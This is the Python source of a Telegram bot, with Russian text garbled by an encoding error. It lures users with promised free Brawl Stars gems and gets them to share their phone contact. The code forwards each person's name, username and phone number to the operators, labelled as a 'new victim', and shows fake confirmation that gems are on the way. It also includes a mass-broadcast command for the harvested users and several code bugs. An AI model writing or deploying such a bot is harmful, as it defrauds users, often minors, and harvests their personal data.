from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.dispatcher import Dispatcher, FSMContext
from aiogram import Bot, Dispatcher, executor, types
import db
import asyncio

#–ö–æ–Ω—Ñ–∏–≥
TOKEN = "—Ç–æ–∫–µ–Ω –∏–∑ @BotFather"
ADMINS = [–∞–¥–º–∏–Ω—ã —á–µ—Ä–µ–∑ –∑–Ω–∞–∫ "," –≤ –∫–æ–Ω—Ü–µ –±–µ–∑ –∫–æ–º—ã!]
GEMS = 950

#–ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è API
bot = Bot(token=TOKEN, parse_mode="html")
dp = Dispatcher(bot, storage=MemoryStorage())

#–°–æ–∑–¥–∞–Ω–∏–µ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö
db.CreateDB()

#–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∑–∞–ø—É—Å–∫–µ
async def started(dp):
    for a in ADMINS:
        await bot.send_message(chat_id=a, text='‚úÖ–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!')

@dp.message_handler(commands=['start'])
async def start(message):
   db.cursor.execute(f"SELECT name FROM users where id = {message.from_user.id}")
   if db.cursor.fetchone() == None:
      db.AddUser(message.from_user.first_name, message.from_user.id)
   don_kb = ReplyKeyboardMarkup(resize_keyboard=True)
   donate = KeyboardButton(text="üíé–ó–ê–ë–†–ê–¢–¨ –ì–ï–ú–´üíé", request_contact=True)
   don_kb.add(donate)
   await message.reply(f'–ü—Ä–∏–≤–µ—Ç, {message.from_user.first_name}!ü§ó\n–Ø - –±–æ—Ç –∫–æ—Ç–æ—Ä—ã–π –∑–∞–¥–æ–Ω–∞—Ç–∏—Ç —Ç–µ–±–µ {GEMS} –≥–µ–º–æ–≤ –≤ –±—Ä–∞–≤–ª —Å—Ç–∞—Ä—Å!ü§ë\n–ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ–Ω–∞—Ç, –Ω–∞–∂–º–∏ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ!üòé', reply_markup=don_kb)

@dp.message_handler(content_types=['contact'])
async def contact(message):
   if message.contact.user_id != message.from_user.id:
      await message.reply("–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–≤–æ–π –∫–æ–Ω—Ç–∞–∫—Ç!")
      return
   for a in ADMINS:
       await bot.send_message(chat_id=a, text=f'üîî–ù–û–í–ê–Ø –ñ–ï–†–¢–í–ê!üîî\n\nüë§–ò–º—è: {message.contact.full_name}\nüÜî–ê–π–¥–∏: <code>{message.contact.user_id}</code>\nüêï–Æ–∑–µ—Ä–Ω–µ–π–º: @{message.from_user.username}\n‚òé–¢–µ–ª–µ—Ñ–æ–Ω: +{message.contact.phone_number}')
       db.AddNumber(message.contact.phone_number, message.from_user.id)
   await message.reply("‚å®–í–≤–µ–¥–∏ —Å–≤–æ–π —Ç–µ–≥ –≤ –∏–≥—Ä–µ! (—Å # –≤ –Ω–∞—á–∞–ª–µ)")

@dp.message_handler(lambda msg: msg.text.lower().startswith('#'))
async def tag(message):
   await message.reply("üì≤–û—Ç–ø—Ä–∞–≤–ª—è—é —Ç–≤–æ–∏ {GEMS} –≥–µ–º–æ–≤..")
   asyncio.sleep(5)
   await message.reply("üî•–í–∞—à–∏ –≥–µ–º—ã –ø–æ—è–≤—è—Ç—Å—è –Ω–∞ –≤–∞—à–µ–º –∞–∫–∫–∞—É–Ω—Ç–µ –≤ —Ç–µ—á–µ–Ω–∏–∏ 24 —á–∞—Å–æ–≤!")

class Rass(StatesGroup):
	msg = State()

@dp.message_handler(commands=['rass'])
async def rass(message):
    if message.from_user.id not in config.ADMIN_IDS:
        return
    await message.answer('üñã –í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç/—Ñ–æ—Ç–æ –¥–ª—è —Ä–∞—Å—Å—ã–ª–∫–∏:')
    await Rass.msg.set()

@dp.message_handler(content_types=types.ContentType.ANY, state=Rass.msg)
async def rass2(message, state: FSMContext):
    await state.finish()
    db.cursor.execute(f"SELECT id FROM users")
    query = db.cursor.fetchall()
    ids = [user[0] for user in query]
    confirm = []
    decline = []
    for rass in ids:
        try:
            await message.copy_to(rass)
            confirm.append(rass)
        except:
            decline.append(rass)
    await message.reply(f'üì£ –†–∞—Å—Å—ã–ª–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!\n\n‚úÖ –£—Å–ø–µ—à–Ω–æ: {len(confirm)}\n‚ùå –ù–µ—É—Å–ø–µ—à–Ω–æ: {len(decline)}')

executor.start_polling(dp, on_startup=started)